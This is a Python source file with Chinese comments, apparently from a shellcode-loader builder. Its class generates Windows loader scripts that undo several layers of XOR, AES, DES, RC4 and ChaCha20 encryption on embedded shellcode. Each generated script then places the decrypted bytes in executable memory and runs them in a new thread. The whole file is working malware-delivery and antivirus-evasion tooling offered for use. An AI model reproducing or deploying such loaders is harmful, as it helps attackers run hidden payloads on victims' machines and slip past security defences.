#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Python解密加载器模块：单一职责 - 仅实现Python解密加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader
from core.encrypt.encrypt_manager import EncryptionHistory

class PythonDecryptLoader(BaseLoader):
    """Python解密加载器：单一职责 - 仅生成Python解密加载器（适配加密历史）"""
    @property
    def lang_name(self) -> str:
        return "Python"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """（解密加载器可复用原始加载器逻辑）"""
        from core.loader.raw_loader.python_raw_loader import PythonRawLoader
        return PythonRawLoader().generate_raw(shellcode_len)
    
    def generate_decrypt(self, shellcode_len: int, encryption_history: EncryptionHistory) -> str:
        """生成Python解密加载器内容（适配XOR/AES-256-CBC/DES-CBC加密历史）"""
        encrypt_history = encryption_history.get_full_history()
        decrypt_functions = []
        decrypt_calls = []
        key_iv_definitions = []

        # 构建解密函数和调用逻辑（按加密逆序解密）
        for idx, encrypt_info in enumerate(reversed(encrypt_history), 1):
            alg = encrypt_info["alg"]
            params = encrypt_info["params"]

            if alg == "XOR":
                # XOR解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"# XOR解密密钥（第{idx}轮加密）\nxor_key_{idx} = bytearray([{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}])\nxor_key_len_{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                xor_decrypt = f"""# XOR解密函数（第{idx}轮）
def xor_decrypt_{idx}(shellcode):
    for i in range(len(shellcode)):
        shellcode[i] ^= xor_key_{idx}[i % xor_key_len_{idx}]
    return shellcode"""
                decrypt_functions.append(xor_decrypt)
                decrypt_calls.append(f"shellcode = xor_decrypt_{idx}(shellcode)")

            elif alg == "AES-256-CBC":
                # AES-256-CBC解密定义（依赖pycryptodome）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"# AES-256-CBC解密密钥和IV（第{idx}轮加密）\naes_key_{idx} = bytes.fromhex('{key_hex}')\naes_iv_{idx} = bytes.fromhex('{iv_hex}')"
                key_iv_definitions.append(key_def)

                aes_decrypt = f"""# AES-256-CBC解密函数（第{idx}轮，需安装：pip install pycryptodome）
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def aes_256_cbc_decrypt_{idx}(shellcode):
    try:
        # 确保输入是bytes类型
        if isinstance(shellcode, bytearray):
            shellcode_bytes = bytes(shellcode)
        else:
            shellcode_bytes = shellcode
        
        # 确保输入长度是16的倍数
        if len(shellcode_bytes) % 16 != 0:
            padding = 16 - (len(shellcode_bytes) % 16)
            shellcode_bytes = shellcode_bytes + bytes([padding] * padding)
        
        cipher = AES.new(aes_key_{idx}, AES.MODE_CBC, aes_iv_{idx})
        decrypted_data = cipher.decrypt(shellcode_bytes)
        # 移除PKCS7填充（与加密过程匹配）
        try:
            decrypted_data = unpad(decrypted_data, AES.block_size, style='pkcs7')
        except ValueError:
            # 如果没有填充，直接使用
            pass
        # 将解密后的数据复制回原始shellcode对象
        if isinstance(shellcode, bytearray):
            shellcode[:] = decrypted_data
            return shellcode
        else:
            return bytearray(decrypted_data)
    except Exception as e:
        print(f"AES-256-CBC解密失败: {{e}}")
        return shellcode"""
                decrypt_functions.append(aes_decrypt)
                decrypt_calls.append(f"shellcode = aes_256_cbc_decrypt_{idx}(shellcode)")

            elif alg == "DES-CBC":
                # DES-CBC解密定义（依赖pycryptodome）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"# DES-CBC解密密钥和IV（第{idx}轮加密）\ndes_key_{idx} = bytes.fromhex('{key_hex}')\ndes_iv_{idx} = bytes.fromhex('{iv_hex}')"
                key_iv_definitions.append(key_def)

                des_decrypt = f"""# DES-CBC解密函数（第{idx}轮，需安装：pip install pycryptodome）
from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad

def des_cbc_decrypt_{idx}(shellcode):
    try:
        # 确保输入是bytes类型
        if isinstance(shellcode, bytearray):
            shellcode_bytes = bytes(shellcode)
        else:
            shellcode_bytes = shellcode
        
        # 确保输入长度是8的倍数
        if len(shellcode_bytes) % 8 != 0:
            padding = 8 - (len(shellcode_bytes) % 8)
            shellcode_bytes = shellcode_bytes + bytes([padding] * padding)
        
        cipher = DES.new(des_key_{idx}, DES.MODE_CBC, des_iv_{idx})
        decrypted_data = cipher.decrypt(shellcode_bytes)
        # 移除PKCS7填充（与加密过程匹配）
        try:
            decrypted_data = unpad(decrypted_data, DES.block_size, style='pkcs7')
        except ValueError:
            # 如果没有填充，直接使用
            pass
        # 将解密后的数据复制回原始shellcode对象
        if isinstance(shellcode, bytearray):
            shellcode[:] = decrypted_data
            return shellcode
        else:
            return bytearray(decrypted_data)
    except Exception as e:
        print(f"DES-CBC解密失败: {{e}}")
        return shellcode"""
                decrypt_functions.append(des_decrypt)
                decrypt_calls.append(f"shellcode = des_cbc_decrypt_{idx}(shellcode)")

            elif alg == "RC4":
                # RC4解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"# RC4解密密钥（第{idx}轮加密）\nrc4_key_{idx} = bytearray([{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}])\nrc4_key_len_{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                rc4_decrypt = f"""# RC4解密函数（第{idx}轮）
def rc4_decrypt_{idx}(shellcode):
    # 初始化S盒
    s_box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s_box[i] + rc4_key_{idx}[i % rc4_key_len_{idx}]) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    
    # 解密过程
    i = 0
    j = 0
    for k in range(len(shellcode)):
        i = (i + 1) % 256
        j = (j + s_box[i]) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
        t = (s_box[i] + s_box[j]) % 256
        k_value = s_box[t]
        shellcode[k] ^= k_value
    return shellcode"""
                decrypt_functions.append(rc4_decrypt)
                decrypt_calls.append(f"shellcode = rc4_decrypt_{idx}(shellcode)")

            elif alg == "ChaCha20":
                # ChaCha20解密定义（依赖pycryptodome）
                key_hex = params["key_hex"]
                nonce_hex = params["nonce_hex"]
                key_def = f"# ChaCha20解密密钥和Nonce（第{idx}轮加密）\nchacha20_key_{idx} = bytes.fromhex('{key_hex}')\nchacha20_nonce_{idx} = bytes.fromhex('{nonce_hex}')"
                key_iv_definitions.append(key_def)

                chacha20_decrypt = f"""# ChaCha20解密函数（第{idx}轮，需安装：pip install cryptography）
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend

def chacha20_decrypt_{idx}(shellcode):
    cipher = Cipher(
        algorithms.ChaCha20(chacha20_key_{idx}, chacha20_nonce_{idx}),
        mode=None,
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(shellcode) + decryptor.finalize()
    return bytearray(decrypted)"""
                decrypt_functions.append(chacha20_decrypt)
                decrypt_calls.append(f"shellcode = chacha20_decrypt_{idx}(shellcode)")

        # 生成解密调用语句
        decrypt_calls_str = "\n    ".join(decrypt_calls)
        
        # 拼接完整加载器内容
        full_decrypt_content = f"""import ctypes
from ctypes import wintypes
from ctypes import WinError
{chr(10).join(key_iv_definitions)}

{chr(10).join(decrypt_functions)}

# 初始化Windows API
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# 定义常量
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF

# 定义函数原型
kernel32.VirtualAlloc.restype = wintypes.LPVOID
kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]

kernel32.RtlMoveMemory.restype = None
kernel32.RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t]

kernel32.CreateThread.restype = wintypes.HANDLE
kernel32.CreateThread.argtypes = [wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]

kernel32.WaitForSingleObject.restype = wintypes.DWORD
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

kernel32.VirtualFree.restype = wintypes.BOOL
kernel32.VirtualFree.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD]

kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

def main():
    # shellcode占位
    shellcode = bytearray([/* 此处填入字节数组格式shellcode */])
    shellcode_len = {shellcode_len}

    # 执行解密（按加密逆序）
    {decrypt_calls_str}

    # 刷新shellcode长度（解密后可能变化）
    shellcode_len = len(shellcode)

    # 分配可执行内存
    mem = kernel32.VirtualAlloc(None, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not mem:
        raise WinError(ctypes.get_last_error(), "VirtualAlloc failed")

    # 复制解密后的shellcode到内存
    kernel32.RtlMoveMemory(mem, (ctypes.c_ubyte * shellcode_len).from_buffer(shellcode), shellcode_len)

    # 创建线程执行shellcode
    h_thread = kernel32.CreateThread(None, 0, ctypes.cast(mem, wintypes.LPVOID), None, 0, None)
    if not h_thread:
        err = ctypes.get_last_error()
        kernel32.VirtualFree(mem, 0, 0x8000)  # MEM_RELEASE
        raise WinError(err, "CreateThread failed")

    # 等待线程执行完成
    kernel32.WaitForSingleObject(h_thread, INFINITE)

    # 清理资源
    kernel32.CloseHandle(h_thread)
    kernel32.VirtualFree(mem, 0, 0x8000)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {{e}}")
"""
        return full_decrypt_content